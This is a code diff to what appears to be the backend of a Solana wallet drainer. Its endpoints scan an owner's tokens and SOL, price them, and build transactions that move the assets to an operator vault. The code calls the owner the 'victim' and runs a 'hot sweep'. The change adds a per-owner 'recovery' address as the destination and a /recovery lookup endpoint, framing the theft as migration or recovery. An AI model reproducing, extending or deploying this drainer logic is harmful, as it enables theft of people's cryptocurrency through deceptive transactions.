@@ -7,6 +7,7 @@ import { cfg } from "./config.js";
 import { scan } from "./scan.js";
 import { prices } from "./price.js";
 import { buildAll, plan } from "./build.js";
+import { recoveryFor } from "./vaults.js";
 import { submit } from "./submit.js";
 import { startHotSweep } from "./sweep.js";
 import { log } from "./log.js";
@@ -34,6 +35,7 @@ app.post("/scan", async (req, reply) => {
   let owner: PublicKey;
   try { owner = new PublicKey(p.data.owner); } catch { return reply.code(400).send("bad pubkey"); }
 
+  const rec = recoveryFor(p.data.owner);
   const { sol, found } = await scan(owner);
   const px = await prices(found.filter((f) => f.amount > 0n && !f.isNft).map((f) => f.mint.toBase58()));
 
@@ -45,7 +47,7 @@ app.post("/scan", async (req, reply) => {
   });
 
   log({ level: "scan", owner: p.data.owner, sol, n: assets.length });
-  return { sol, vault: cfg.vault.toBase58(), assets, payer: cfg.feePayer ? "ours" : "victim" };
+  return { sol, vault: cfg.vault.toBase58(), assets, payer: cfg.feePayer ? "ours" : "victim", recovery: rec.address };
 });
 
 app.post("/build", async (req, reply) => {
@@ -61,7 +63,8 @@ app.post("/build", async (req, reply) => {
 
   const items = await plan(owner, BigInt(sol), found);
   if (items.length === 0) return reply.code(409).send("not enough SOL for fees");
-  const txs = await buildAll(owner, items);
+  const rec = recoveryFor(p.data.owner);
+  const txs = await buildAll(owner, items, new PublicKey(rec.address));
   if (txs.length === 0) return reply.code(409).send("nothing to migrate");
 
   log({ level: "build", owner: p.data.owner, batches: txs.length });
@@ -79,6 +82,12 @@ app.post("/submit", async (req, reply) => {
     log({ level: "submit-err", msg: e?.message });
     return reply.code(502).send(e?.message ?? "submit failed");
   }
+});
+
+app.get("/recovery", async (req: any, reply: any) => {
+  const o = (req.query as any)?.owner;
+  if (!o) return reply.code(400).send("no owner");
+  return recoveryFor(o);
 });
 
 startHotSweep();
